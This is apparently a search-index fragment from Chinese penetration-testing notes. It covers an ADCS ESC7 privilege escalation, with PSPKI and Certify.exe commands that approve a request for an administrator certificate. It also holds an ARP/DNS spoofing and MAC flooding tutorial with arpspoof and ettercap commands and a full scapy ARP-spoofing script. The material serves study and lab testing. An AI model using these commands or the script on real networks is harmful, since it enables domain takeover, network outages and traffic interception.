$ConfigReader.GetConfigEntry(\"EditFlags\", \"PolicyModules\\CertificateAuthority_MicrosoftDefault.Policy\") $ConfigReader.SetConfigEntry(1376590, \"PolicyModules\\CertificateAuthority_MicrosoftDefault.Policy\") 2.\u5bf9\u4e8e \u201c\u9881\u53d1\u548c\u7ba1\u7406\u8bc1\u4e66\u201d\uff08ManageCertificates\uff09\u6743\u9650 \u4e00\u4e2a\u540d\u4e3a \u201cApproveReqTemplate\u201d \u7684\u6a21\u677f\uff0c\u5176\u5141\u8bb8\u57df\u8eab\u4efd\u9a8c\u8bc1\u5e76\u4e14\u5728 mspki-certificate-name-flag \u5c5e\u6027\u4e2d\u8bbe\u7f6e\u4e86 CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT \u6807\u5fd7\u3002\u6b63\u5e38\u60c5\u51b5\u4e0b\u6211\u4eec\u53ef\u4ee5\u6309\u7167\u524d\u6587 \u201cMisconfigured Certificate Templates - ESC1\u201d \u7684\u65b9\u6cd5\u4e3a\u57df\u7ba1\u7406\u5458\u7684\u7533\u8bf7\u8bc1\u4e66\uff0c\u4f46\u662f\u8be5\u6a21\u677f\u5728\u53d1\u5e03\u8981\u6c42\u4e2d\u5f00\u542f\u4e86 \u201cCA \u8bc1\u4e66\u7ba1\u7406\u7a0b\u5e8f\u6279\u51c6(C)\u201d \u4fdd\u62a4\uff0c\u5982\u4e0b\u56fe\u6240\u793a\u3002 \u90a3\u4e48\u6211\u4eec\u6240\u6709\u9488\u5bf9\u8be5\u6a21\u677f\u7684\u6ce8\u518c\u8bf7\u6c42\u90fd\u5c06\u88ab\u6302\u8d77\uff0c\u76f4\u5230\u7ba1\u7406\u5458\u5728 certsrv.msc \u7684 \u201c\u6302\u8d77\u7684\u7533\u8bf7\u201d \u4e2d\u5bf9\u8be5\u8bf7\u6c42\u4e88\u4ee5 \u201c\u9881\u53d1\u201d \u6216 \u201c\u62d2\u7edd\u201d\u3002 \u4f46\u662f\u5982\u679c\u6211\u4eec\u6709ManageCertificates\u6743\u9650\uff08\u67e5\u8be2\u547d\u4ee4\u5982\u4e0b\uff09\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u81ea\u4e3b\u8ba9\u8be5\u7533\u8bf7\u901a\u8fc7 Import-Module -Name PSPKI Get-CertificationAuthority -ComputerName dc01.pentest.com | Get-CertificationAuthorityAcl | select -expand Access \u7167\u6837\u8bf7\u6c42\u8bc1\u4e66\uff0c\u56e0\u4e3a\u6ce8\u518c\u88ab\u6302\u8d77\uff0c\u6211\u4eec\u53ea\u80fd\u83b7\u5f97\u4e00\u4e2arequest id Certify.exe request /ca:DC01.pentest.com\\pentest-DC01-CA /template:ApproveReqTemplate /altname:PENTEST\\Administrator \u518d\u901a\u8fc7\u5982\u4e0b\u547d\u4ee4\u8ba9\u7533\u8bf7\u901a\u8fc7\uff08request id \u4e3a56\u7684\u7533\u8bf7\u901a\u8fc7\uff09 Import-Module PSPKI Get-CertificationAuthority -ComputerName dc01.pentest.com | Get-PendingRequest -RequestID 56 | Approve-CertificateRequest \u518d\u6b21\u7533\u8bf7\u8bc1\u4e66\uff0c\u6307\u5b9arequest id\u4e3a\u5148\u524d\u768456\uff0c\u5373\u53ef\u83b7\u5f97admin\u8bc1\u4e66 Certify.exe request /ca:DC01.pentest.com\\pentest-DC01-CA /id:56","title":"Vulnerable Certificate Authority Access Control - ESC7"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/ADCS%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/ADCS%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/#_8","text":"","title":"\u57df\u6743\u9650\u7ef4\u6301"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/ARP%E6%AC%BA%E9%AA%97%26DNS%E6%AC%BA%E9%AA%97%26mac%E6%B3%9B%E6%B4%AA%E6%94%BB%E5%87%BB/ARP%E6%AC%BA%E9%AA%97%26DNS%E6%AC%BA%E9%AA%97%26mac%E6%B3%9B%E6%B4%AA%E6%94%BB%E5%87%BB/","text":"ARP\u6b3a\u9a97\\&DNS\u6b3a\u9a97\\&mac\u6cdb\u6d2a\u653b\u51fb \u76ee\u5f55 arp\u534f\u8bae\u4e0e\u6b3a\u9a97 \u7b80\u5355\u6982\u8981\uff1a \u4f5c\u7528\uff1a arp\u9ad8\u901f\u7f13\u5b58\u8868\uff1a arp\u5206\u7ec4\u683c\u5f0f \u514d\u8d39arp \u4ee3\u7406arp arp\u653b\u51fb \u653b\u51fb\u539f\u7406\uff1a \u5229\u7528arspoof\u5b9e\u73b0\u65ad\u7f51\u653b\u51fb \u4f7f\u7528arpspoof\u5de5\u5177\u548cdriftnet\u5de5\u5177\u6765\u622a\u83b7\u56fe\u7247\uff0cwireshark\u6765\u76f4\u63a5\u6293\u5305 arp\u653b\u51fb\u7684\u811a\u672c\u7f16\u5199\uff1a DNS\u6b3a\u9a97 dns\u5de5\u4f5c\u539f\u7406 DNS\u6b3a\u9a97\u539f\u7406 DNS\u6b3a\u9a97\u5de5\u5177\u5b9e\u73b0 mac\u6cdb\u6d2a\u653b\u51fb \u4ea4\u6362\u673a: mac\u8868\u4e0earp\u7f13\u5b58\u8868\u7684\u533a\u522b \u4ea4\u6362\u673amac\u8868\u7684\u5b66\u4e60\u673a\u5236\uff1a \u6cdb\u6d2a\u653b\u51fb\u539f\u7406\uff1a \u4f7f\u7528kali\u4e0a\u7684macof\u6765\u8fdb\u884c\u6cdb\u6d2a\u653b\u51fb mac\u6cdb\u6d2a\u653b\u51fb\u7684\u5c40\u9650\u6027: arp\u534f\u8bae\u4e0e\u6b3a\u9a97 \u7b80\u5355\u6982\u8981\uff1a \u901a\u8fc7\u6b64\u534f\u8bae\u6765\u83b7\u53d6\u5c40\u57df\u7f51\u4e2d\u67d0IP\u5730\u5740\u7684mac\u5730\u5740 \u4f5c\u7528\uff1a \u5728\u5c40\u57df\u7f51\u4e2d\u7684\u673a\u5668\u4e92\u76f8\u53d1\u9001\u6d88\u606f\u65f6\uff0c\u9760\u7684\u662fmac\u5730\u5740\uff08\u4e5f\u53eb\u4ee5\u592a\u7f51\u5730\u5740\uff09\u6765\u786e\u5b9a\u76ee\u7684\u5730\u5740\u7684\uff0c\u800c\u6211\u4eec\u53ea\u77e5\u9053IP\u5730\u5740\uff0c\u6240\u4ee5\u9700\u8981arp\u534f\u8bae\u6765\u628aip\u5730\u5740\u6620\u5c04\u4e3amac\u5730\u5740\u3002 \u5177\u4f53\u5b9e\u73b0\u539f\u7406\u662f\uff0c\u6bd4\u5982\u6211\u60f3\u77e5\u9053192.168.1.1\u7684mac\u5730\u5740\uff0c\u5c31\u4f1a\u5728\u5e7f\u64ad\u57df\u91cc\u5e7f\u64adarp\u8bf7\u6c42\uff0cip\u4e0d\u662f192.168.1.1\u7684\u4e3b\u673a\u4f1a\u81ea\u52a8\u5ffd\u7565\u8bf7\u6c42\uff0c\u800c192.168.1.1\u4e3b\u673a\u5219\u4f1a\u5e94\u7b54\u8bf7\u6c42\uff0c\u5e76\u8fd4\u56de\u81ea\u5df1\u7684mac\u5730\u5740(\u7531IP\u5b9a\u4f4d\u5230mac\u5730\u5740) arp\u9ad8\u901f\u7f13\u5b58\u8868\uff1a \u8fd9\u4e2a\u8868\u7528\u6765\u7f13\u5b58 ip\u5730\u5740\u4e0emac\u5730\u5740 \u7684\u5bf9\u5e94\u5173\u7cfb \u6709\u52a8\u6001\u8868\u548c\u9759\u6001\u8868\uff1a \u52a8\u6001\u8868\u968f\u65f6\u95f4\u7684\u63a8\u79fb\u81ea\u52a8\u6dfb\u52a0\u548c\u5220\u9664,\u6bcf\u4e2a\u52a8\u6001arp\u7f13\u5b58\u90fd\u6709\u81ea\u5df1\u7684TTL(\u751f\u5b58\u65f6\u95f4).TTL\u4e3a0\u5c31\u4f1a\u88ab\u5220 \u9759\u6001\u8868\u662f\u6c38\u4e45\u6027\u7684\uff0c\u624b\u52a8\u6dfb\u52a0\u548c\u5220\u9664\u3002 \u5c40\u57df\u7f51\u4e2dip\u5230mac\u5730\u5740\u89e3\u6790\u8fc7\u7a0b\uff1a 1.\u5f53\u7f13\u5b58\u8868\u4e2d\u5b58\u5728\u76ee\u7684IP\u5bf9\u5e94\u7684mac\u5730\u5740\u65f6 \u5219\u76f4\u63a5\u8fd4\u56de\u4e0eIP\u5bf9\u5e94\u7684mac\u5730\u5740 2.\u5f53\u7f13\u5b58\u8868\u4e2d\u6ca1\u6709\u5bf9\u5e94\u5173\u7cfb\u65f6,\u5219\u5411\u5c40\u57df\u7f51\u4e2d\u53d1\u9001arp\u5e7f\u64ad\u8bf7\u6c42\u76ee\u7684IP\u7684mac\uff0c\u6536\u5230arp\u5e94\u7b54\u540e\u5c06\u5bf9\u5e94\u5173\u7cfb\u8bb0\u5f55\u5230\u9ad8\u901f\u7f13\u5b58\u8868\u4e2d \u9ad8\u901f\u7f13\u5b58\u8868\u7684\u4f18\u7f3a\u70b9 \uff1a \u4f18\u70b9\uff1a\u51cf\u5c11\u7f51\u7edc\u901a\u4fe1\u91cf\uff0c\u63d0\u9ad8\u901a\u4fe1\u6548\u7387 \u7f3a\u70b9\uff1a\u4f1a\u9020\u6210\u5b89\u5168\u9690\u60a3 arp\u5206\u7ec4\u683c\u5f0f 1.arp\u8bf7\u6c42\u7684\u76ee\u7684mac\u5730\u5740 \u5168f\u65f6\u4ee3\u8868\u5e7f\u64ad\u5730\u5740 2.arp\u8bf7\u6c42\u7684\u6765\u6e90mac\u5730\u5740 3.\u5b57\u6bb53 \u4ee5\u592a\u7f51\u5e27\u7c7b\u578b\u8868\u793a\u7684\u662f\u540e\u9762\u7684\u6570\u636e\u7c7b\u578b\uff0cARP\u8bf7\u6c42\u548cARP\u5e94\u7b54\u8fd9\u4e2a\u503c\u4e3a0x0806 4.\u5b57\u6bb54 \u8868\u793a\u786c\u4ef6\u5730\u5740\u7684\u7c7b\u578b\uff0c\u786c\u4ef6\u5730\u5740\u4e0d\u53ea\u4ee5\u592a\u7f51\u4e00\u79cd\uff0c\u662f\u4ee5\u592a\u7f51\u7c7b\u578b\u65f6\u6b64\u503c\u4e3a1 5.\u5b57\u6bb55 \u8868\u793a\u8981\u6620\u5c04\u7684\u534f\u8bae\u5730\u5740\u7684\u7c7b\u578b\uff0c\u8981\u5bf9IPv4\u5730\u5740\u8fdb\u884c\u6620\u5c04\uff0c\u6b64\u503c\u4e3a0x0800 67.\u5b57\u6bb56\u548c7 \u8868\u793a\u786c\u4ef6\u5730\u5740\u957f\u5ea6\u548c\u534f\u8bae\u5730\u5740\u957f\u5ea6\uff0cMAC\u5730\u5740\u53606\u5b57\u8282\uff0cIP\u5730\u5740\u53604\u5b57\u8282 8.\u64cd\u4f5c\u7c7b\u578b\u5b57\u6bb5\uff0c\u503c\u4e3a1\uff0c\u8868\u793a\u8fdb\u884cARP\u8bf7\u6c42\uff1b\u503c\u4e3a2\uff0c\u8868\u793a\u8fdb\u884cARP\u5e94\u7b54\uff1b \u503c\u4e3a3\uff0c\u8868\u793a\u8fdb\u884cRARP\u8bf7\u6c42\uff1b\u503c\u4e3a4\uff0c\u8868\u793a\u8fdb\u884cRARP\u5e94\u7b54\u3002\uff08\u91cd\u8981\uff09 9.\u5b57\u6bb59 \u53d1\u9001\u7aefARP\u8bf7\u6c42\u6216\u5e94\u7b54\u7684\u786c\u4ef6\u5730\u5740\uff0c\u8fd9\u91cc\u662f\u4ee5\u592a\u7f51\u5730\u5740\uff0c\u548c\u5b57\u6bb52\u76f8\u540c\u3002 10.\u5b57\u6bb510 \u53d1\u9001ARP\u8bf7\u6c42\u6216\u5e94\u7b54\u7684IP\u5730\u5740\u3002 11 12.\u76ee\u7684\u7aef\u7684\u786c\u4ef6\u5730\u5740\u548c\u534f\u8bae\u5730\u5740 \u514d\u8d39arp \u514d\u8d39arp\u662f\u6307\u4e3b\u673a\u53d1\u9001arp\u67e5\u627e\u81ea\u5df1\u7684IP\u5730\u5740,\u53d1\u9001\u7aef\u7684\u534f\u8bae\u5730\u5740\u548c\u76ee\u7684\u7aef\u7684\u534f\u8bae\u5730\u5740\u662f\u4e00\u81f4\u7684 \u4f5c\u7528\uff1a (\u5982\u67d0\u4e9b\u7f51\u5173\u8bbe\u5907\u4f1a\u6bcf\u9694\u4e00\u5b9a\u65f6\u95f4\u5e7f\u64ad\u4e00\u6b21\u514d\u8d39arp\uff0c\u8ba9\u7f51\u7edc\u4e2d\u5176\u4ed6\u4e3b\u673a\u66f4\u65b0arp\u7f13\u5b58\u8868\u4e2d\u7f51\u5173\u7684mac\u5730\u5740\uff0c\u7f13\u89e3arp\u653b\u51fb\u6548\u679c) (\u5982\u9ed1\u5ba2\u53ef\u4ee5\u4f7f\u7528\u514d\u8d39arp\uff0c\u5c06\u865a\u5047\u4f2a\u9020\u7684 ip mac\u5bf9\u5e94\u5173\u7cfb\u901a\u8fc7arp\u5e7f\u64ad\u51fa\u53bb\uff0c\u4f7f\u7f51\u7edc\u4e2d\u5176\u4ed6\u4e3b\u673a\u66f4\u65b0arp\u7f13\u5b58\u8868\uff0c\u66f4\u65b0\u5b8c\u6210\u540e\uff0c\u8fd9\u4e9b\u4e3b\u673a\u7684\u6570\u636e\u4f1a\u8f6c\u53d1\u5230\u9519\u8bef\u7684mac\u5730\u5740\uff0c\u4ece\u800c\u5b9e\u73b0arp\u6b3a\u9a97\uff09 2.\u68c0\u67e5\u5e7f\u64ad\u57df\u91cc\u7684\u5176\u4ed6\u4e3b\u673a\u6709\u6ca1\u6709\u4f7f\u7528\u81ea\u5df1\u7684IP\uff0c\u5982\u679c\u4f7f\u7528\u4e86\uff0c\u5219\u4f1a\u5f39\u51fa IP\u51b2\u7a81 \u5b57\u6837 \u514d\u8d39arp\u4e0e\u666e\u901aarp\u7684\u533a\u522b: \u666e\u901aarp\u7684\u8bf7\u6c42\u662f \u6211\u9700\u8981\u67d0ip\u7684mac\u5730\u5740\uff0c\u8be5IP\u662f\u5176\u4ed6\u673a\u5668\u7684IP\u5730\u5740 \u514d\u8d39arp\u7684\u8bf7\u6c42\u662f \u6211\u9700\u8981\u67d0IP\u7684mac\u5730\u5740\uff0c\u8be5IP\u662f\u673a\u5668\u81ea\u5df1\u7684IP\u5730\u5740\uff0c\u8d77\u5230\u5ba3\u544a\u4f5c\u7528\uff0c\u53d1\u51fa\u53bb\u540e\u662f\u4e0d\u5e0c\u671b\u5f97\u5230\u56de\u5e94\u7684\uff0c\u82e5\u6709\u56de\u5e94\u5219\u8bf4\u660e\u4e86IP\u51b2\u7a81\u4e86 \u4ee3\u7406arp \u4ee3\u7406arp\u7684\u610f\u601d\u662f\uff0c\u4e00\u4e2a\u4e3b\u673a\u628a\u81ea\u5df1\u7684mac\u5730\u5740\u7ed9\u53e6\u4e00\u53f0\u673a\u5668\u4f7f\u7528\u6765\u5e94\u7b54\u5176\u4ed6\u4e3b\u673a\u7684arp\u8bf7\u6c42\u3002 \u5b9e\u9645\u4e0a\uff0c\u8fd9\u5df2\u7ecf\u662f\u67d0\u79cd\u610f\u4e49\u4e0a\u7684arp\u6b3a\u9a97 arp\u653b\u51fb \u653b\u51fb\u539f\u7406\uff1a arp\u653b\u51fb\u5c31\u662f\u4f2a\u9020IP\u4e0emac\u7684\u5bf9\u5e94\u5173\u7cfb\u6765\u5b9e\u73b0arp\u6b3a\u9a97\uff0c\u653b\u51fb\u8005\u53ea\u8981\u6301\u7eed\u4e0d\u65ad\u7684\u53d1\u9001\u4f2a\u9020\u7684arp\u54cd\u5e94\u5305\u5c31\u80fd\u66f4\u6539\u76ee\u6807\u4e3b\u673a\u7684arp\u7f13\u5b58\u8868\uff0c\u9020\u6210 \u65ad\u7f51\u653b\u51fb \u6216 \u4e2d\u95f4\u4eba\u653b\u51fb \u5229\u7528arspoof\u5b9e\u73b0\u65ad\u7f51\u653b\u51fb \u7528kali\u548c\u7269\u7406\u673a\u8fdb\u884c\u6d4b\u8bd5\uff0ckali\u662f\u653b\u51fb\u673a\uff0c\u7269\u7406\u673a\u662f\u53d7\u5bb3\u8005 \u9996\u5148\u6536\u96c6kali\uff0c\u7269\u7406\u673a\uff0c\u7f51\u5173\u7684ip\u5730\u5740\u548cmac \u5047\u8bbe\u6211\u4eec\u60f3\u8981\u5728\u5b9e\u9645\u4e2d\u5b9e\u65bd\u653b\u51fb\uff0c\u9996\u5148\u9700\u8981\u626b\u63cf\u5c40\u57df\u7f51\u4e2d\u7684IP\uff0c\u4f46\u6211\u4eec\u4e00\u4e2a\u4e00\u4e2aping\u5c31\u5f88\u6d6a\u8d39\u65f6\u95f4\u4e86\uff0c\u6240\u4ee5\u9700\u8981fping\u547d\u4ee4 \u89e3\u8bfb\u4e00\u4e0b\u547d\u4ee4 arpspoof -i kali\u7f51\u5361\u540d -t \u88ab\u653b\u51fb\u673aip \u7f51\u5173 \u597d\u7684\uff0c\u6211\u4eec\u7269\u7406\u673a\u6210\u529f\u88ab\u65ad\u7f51 \u4f7f\u7528arpspoof\u5de5\u5177\u548cdriftnet\u5de5\u5177\u6765\u622a\u83b7\u56fe\u7247\uff0cwireshark\u6765\u76f4\u63a5\u6293\u5305 \u7136\u540e\u6211\u4eec\u6267\u884carpspoog\u6307\u4ee4 \u6b64\u65f6\u6211\u4eec\u7269\u7406\u673a\u5c31\u80fd\u8fde\u4e0a\u5916\u7f51\u4e86 \u5751\u70b9:\u5f00\u542fip\u8f6c\u53d1\u540e\u7269\u7406\u673a\u4f9d\u65e7\u4e0d\u80fd\u8fde\u4e0a\u5916\u7f51. \u6211\u7684\u89e3\u51b3\u65b9\u6cd5\u662f\u91cd\u542f\u4e00\u4e0b\uff0c\u518d\u4fee\u6539\u4ee5\u4e0bip_forward\u6587\u4ef6\u7136\u540e\u7b49\u4e00\u4f1a\uff0c\u7269\u7406\u673a\u5c31\u53ef\u4ee5\u8fde\u4e0a\u5916\u7f51\u4e86.arp\u6b3a\u9a97\u540e\u7269\u7406\u673a\u7f51\u53ef\u80fd\u4f1a\u5361\u3002 \u6b64\u65f6\uff0c\u7269\u7406\u673a\u53d1\u7ed9\u7f51\u5173\u7684\u901a\u4fe1\u4fe1\u606f\u6211\u4eec\u90fd\u80fd\u83b7\u5f97\u5230\u4e86\uff0c\u6211\u4eec\u53ef\u4ee5\u5728\u865a\u62df\u673a\u4e2d\u4f7f\u7528driftnet\u5de5\u5177\u6355\u83b7\u7269\u7406\u673a\u6b63\u5728\u6d4f\u89c8\u7684\u56fe\u7247 arp\u653b\u51fb\u7684\u811a\u672c\u7f16\u5199\uff1a arp\u653b\u51fb\u811a\u672c\u9700\u8981\u7528\u5230scapy\u5e93\u6765\u5e2e\u52a9\u6211\u4eec\u5b8c\u6210arp\u6570\u636e\u5305\u7684\u7f16\u5199 \u8bb2\u8bb2\u91cc\u9762\u7684\u4e00\u4e9b\u51fd\u6570(\u6ca1\u6709\u7ee7\u7eed\u7814\u7a76scapy\u5e93) get_if_hwaddr('\u7f51\u5361\u540d') //\u83b7\u5f97\u81ea\u5df1\u7684mac\u5730\u5740\uff0c\u4e00\u822c\u586bWLAN\u6216eth0 getmacbyip('ip) //\u83b7\u5f97\u67d0IP\u7684mac\u5730\u5740 srp(....) //\u53d1\u7b2c\u4e8c\u5c42\u5305\u5e76\u8fd4\u7b49\u5f85\u56de\u5e94\uff0c\u8fd4\u56de\u503c\u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u56de\u5e94\u5305\u4f53\u3002\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f\u672a\u56de\u5e94\u5305\u4f53 sendp(Ether(src=a,dst=b)/ARP(hwsrc=c,psrc=d,pdst=e,op=f)) //\u8fd9\u662farp\u53d1\u5305\u7684\u6784\u9020 sendp\u662f\u53d1\u7b2c\u4e8c\u5c42\u6570\u636e\u5305\u5e76\u4e0d\u7b49\u5f85\u56de\u5305 Ether\u662f\u6784\u9020\u5305\u4f53\u7684\u610f\u601d //a\u4e3a\u81ea\u5df1\u7684mac\u5730\u5740 b\u4e3a\u76ee\u6807\u673a\u5668\u7684mac\u5730\u5740\uff0c //c\u4e3a\u53d1\u5305\u7684\u6765\u6e90mac\uff0cd\u4e3a\u53d1\u5305\u7684\u6765\u6e90ip\uff0ce\u662f\u76ee\u6807\u673a\u5668\u7684ip\uff0cf\u662farp\u64cd\u4f5c\u7c7b\u578b\u5b57\u7b26 //arp\u6b3a\u9a97\u7684\u8bdd\uff0c\u628ad\u6539\u6210\u7f51\u5173IP\u5373\u53ef \u7f51\u4e0a\u5ad6\u7684ip\uff0cmac\u626b\u63cf\u6a21\u5757\uff0c\u8fd9\u4e00\u6b65\u4e5f\u53ef\u4ee5\u624b\u52a8\u83b7\u53d6 from scapy.all import * ##im_scan('192.168.1.1/24'),mac ip\u5730\u5740\u626b\u63cf\u51fd\u6570 def im_scan(ipduan): ipscan=ipduan try: ans,unans = srp(Ether(dst=\"FF:FF:FF:FF:FF:FF\")/ARP(pdst=ipscan),timeout=2,verbose=False) except Exception as e: print (str(e)) else: for snd,rcv in ans: list_mac=rcv.sprintf(\"%Ether.src% - %ARP.psrc%\") print (list_mac) \u8fd9\u4e2a\u811a\u672c\u4ec5\u80fd\u65ad\u7f51\u55f7,\u53ef\u4ee5\u5bf9\u5355\u4e2a\u673a\u5668\u65ad\u7f51\uff0c\u4e5f\u53ef\u4ee5\u65ad\u6574\u4e2a\u5c40\u57df\u7f51\u7684\u7f51 from scapy.all import * import time import threading def im_scan(ipduan):#\u626b\u63cf ipscan=ipduan try: ans,unans = srp(Ether(dst=\"FF:FF:FF:FF:FF:FF\")/ARP(pdst=ipscan),timeout=2,verbose=False) except Exception as e: print (str(e)) else: for snd,rcv in ans: list_mac=rcv.sprintf(\"%Ether.src% - %ARP.psrc%\") print (list_mac) def arp_spoof(tgt_ip,gateway_ip,iface): mmac=get_if_hwaddr(iface) tgt_mac=getmacbyip(tgt_ip) if tgt_ip: while 1: sendp(Ether(src=mmac,dst='ff:ff:ff:ff:ff:ff')/ARP(hwsrc=mmac,psrc=gateway_ip,pdst=tgt_ip,op=2)) else: while 1: sendp(Ether(src=mmac,dst='ff:ff:ff:ff:ff:ff')/ARP(hwsrc=mmac,psrc=gateway_ip,op=2)) def arp_gate(tgt_ip,gateway_ip,iface): mmac=get_if_hwaddr(iface) tgt_mac=getmacbyip(tgt_ip) while 1: sendp(Ether(dst=gateway_mac,src=mmac)/ARP(hwsrc=mmac,psrc=tgt_ip,pdst=gateway_ip,op=2)) if __name__=='__main__': ipduan='192.168.0.0/24' tgt_ip='192.168.0.104' #\u8981\u6253\u6574\u4e2a\u5c40\u57df\u7f51\u5c31\u522b\u8bbe\u7f6e\u8fd9\u4e2a\uff0c\u8981\u622a\u83b7\u5916\u754c\u53d1\u5f80\u673a\u5668\u7684\u6570\u636e\u8fd9\u4e2a\u4e5f\u5fc5\u987b\u8bbe\u7f6e gateway_ip='192.168.0.1' iface='WLAN' threads_num=20 print(\"\u5982\u679c\u60f3\u641e\u6574\u4e2a\u5c40\u57df\u7f51\u5c31\u522b\u8bbe\u7f6etgt_ip,\u8981\u622a\u83b7\u5916\u754c\u53d1\u5f80\u673a\u5668\u7684\u6570\u636e\u8fd9\u4e2a\u5fc5\u987b\u8bbe\u7f6e\") so_scan=input(\"[+]\u8981\u626b\u63cf\u5c40\u57df\u7f51\u5b58\u6d3b\u4e3b\u673a\u548c\u5b83\u7684mac\u5417[Y/N]\") if so_scan=='Y': im_scan(ipduan) else: so_judge=input(\"[+]\u4f60\u662f\u60f3\u8ba9\u673a\u5668\u7684\u53d1\u9001\u7684\u6570\u636e\u88ab\u4f60\u622a\u83b7Y\uff0c\u8fd8\u662f\u5916\u754c\u53d1\u9001\u7ed9\u673a\u5668\u7684\u6570\u636e\u88ab\u4f60\u622a\u83b7N[Y/N]\") if so_judge=='Y': try: print('\u5f00\u59cb\u622a\u80e1\u673a\u5668\u53d1\u9001\u5f80\u5916\u754c\u7684\u6570\u636e') time.sleep(3) for i in range(threads_num): t1=threading.Thread(target=arp_spoof,args=(tgt_ip,gateway_ip,iface),name=str(i)) t1.start() except KeyboardInterrupt: print('[+]stopppppppp') else: if tgt_ip: try: print('\u5f00\u59cb\u622a\u80e1\u5916\u754c\u53d1\u5f80\u673a\u5668\u7684\u6570\u636e') time.sleep(3) for i in range(threads_num): t2=threading.Thread(target=arp_gate,args=(tgt_ip,gateway_ip,iface),name=str(i)) t2.start() except KeyboardInterrupt: print('[+]stopppppppp') else: print('\u8bf7\u8bbe\u7f6etgt_ip') \u5e7f\u64ad\u6b3a\u9a97\uff0c\u53d7\u5bb3\u673a\u4e0a\u7684\u6293\u5305\u6548\u679c 3c\u90a3\u4e2a\u662f\u6211\u7684mac\u5730\u5740 DNS\u6b3a\u9a97 dns\u5de5\u4f5c\u539f\u7406 dns\uff08\u57df\u540d\u7cfb\u7edf\uff09\u5c06\u57df\u540d\u548cIP\u5730\u5740\u76f8\u4e92\u6620\u5c04\uff0cdns\u534f\u8bae\u5373\u57df\u540d\u89e3\u6790\u534f\u8bae\uff0c\u7528\u6765\u5c06\u7528\u6237\u8f93\u5165\u7684\u57df\u540d\u89e3\u6790\u4e3aIP\u3002 \u5177\u4f53\u4e00\u70b9\uff0c\u5f53\u7528\u6237\u8bbf\u95ee\u67d0\u4e2a\u57df\u540d\u5982 www.baidu.com \u65f6\uff0c \u9996\u5148\u5411\u672c\u5730dns\u53d1\u51fa\u8bf7\u6c42 \u82e5\u672c\u5730dns\u7f13\u5b58\u8868\u65e0\u8be5\u57df\u540dIP\u6620\u5c04\u5173\u7cfb\uff0c\u5c31\u4f1a\u5411\u6839\u57df\u540d\u670d\u52a1\u5668\u53d1\u8d77\u67e5\u8be2\uff0c\u6839\u57df\u540d\u670d\u52a1\u5668\u8fd4\u56decom\u57df\u670d\u52a1\u5668\u5730\u5740\u7ed9\u672c\u5730dns\u670d\u52a1\u5668 \u672c\u5730dns\u670d\u52a1\u5668\u5411com\u57df\u670d\u52a1\u5668\u53d1\u8d77\u67e5\u8be2\uff0ccom\u57df\u670d\u52a1\u5668\u8fd4\u56debaidu.com\u57df\u670d\u52a1\u5668\u7ed9\u672c\u5730dns\u670d\u52a1\u5668 \u672c\u5730dns\u670d\u52a1\u5668\u5411baidu.com\u57df\u670d\u52a1\u5668\u53d1\u8d77\u67e5\u8be2\uff0cbaidu.com\u57df\u670d\u52a1\u5668\u8fd4\u56de www.baidu.com \u5730\u5740 DNS\u6b3a\u9a97\u539f\u7406 \u5728arp\u6b3a\u9a97\u540e\u83b7\u53d6\u5230\u4e86\u53d7\u5bb3\u673a\u53d1\u8d77\u7684dns\u8bf7\u6c42\u5305\uff0c\u7136\u540e\u8fd4\u56de\u4e00\u4e2a\u81ea\u5df1\u6784\u9020\u7684dns\u54cd\u5e94\u5305\uff0c\u4f2a\u9020\u81ea\u5df1\u60f3\u8981\u7684ip\u57df\u540d\u6620\u5c04\u5173\u7cfb\u3002 \u56e0\u4e3aDNS\u6b3a\u9a97\u662f\u5efa\u7acb\u5728arp\u6b3a\u9a97\u57fa\u7840\u4e0a\uff0carp\u6b3a\u9a97\u53c8\u5fc5\u987b\u5728\u5c40\u57df\u7f51\u8fdb\u884c\uff0c\u6545DNS\u6b3a\u9a97\u4e5f\u53ea\u80fd\u5728\u5c40\u57df\u7f51\u8fdb\u884c DNS\u6b3a\u9a97\u5de5\u5177\u5b9e\u73b0 ettercap -T -q -P dns_spoof -M arp:remote /\u53d7\u5bb3\u8005IP/// mac\u6cdb\u6d2a\u653b\u51fb \u4ea4\u6362\u673a: \u4ea4\u6362\u673a\uff0c\u53ea\u80fd\u505a\u6709\u7ebf\u94fe\u63a5\uff0c\u6240\u4ee5\u62ff\u8fd9\u4e2a\u662f\u4e0d\u80fd\u7528\u4f5cwifi\u7684\u3002 \u4ea4\u6362\u673a\u7684\u4f5c\u7528\u662f\u8f6c\u53d1\u5c40\u57df\u7f51\u5185\u4e24\u53f0\u673a\u5668\u4e4b\u95f4\u7684\u4e92\u76f8\u7684\u8bf7\u6c42\uff08\u6709\u7ebf\u8fde\u63a5\u7684\u673a\u5668\uff09\u3002 \u4ea4\u6362\u673a\u5177\u4f53\u4f20\u8f93\u6570\u636e\u5e27\u7684\u8fc7\u7a0b\uff1a \u5047\u8bbe\u4e3b\u673aA\u7b2c\u4e00\u6b21\u5411\u4e3b\u673aB\u53d1\u9001\u6570\u636e \u4e3b\u673aA\u5411\u4ea4\u6362\u673a\u53d1\u8d77\u4e00\u4e2a\u6e90mac\u5730\u5740\u4e3a\u81ea\u5df1\uff0c\u76ee\u6807mac\u5730\u5740\u4e3a\u4e3b\u673aB\u7684\u6570\u636e\u5e27 \u4ea4\u6362\u673a\u6536\u5230\u540e\uff0c\u5c06\u6e90mac\u5730\u5740\u548c\u5176\u5bf9\u5e94\u63a5\u53e3\u8bb0\u5f55\u5230mac\u5730\u5740\u8868\u4e2d\uff08mac\u5730\u5740\u8868\u4e0earp\u7f13\u5b58\u8868\u6709\u533a\u522b\uff09 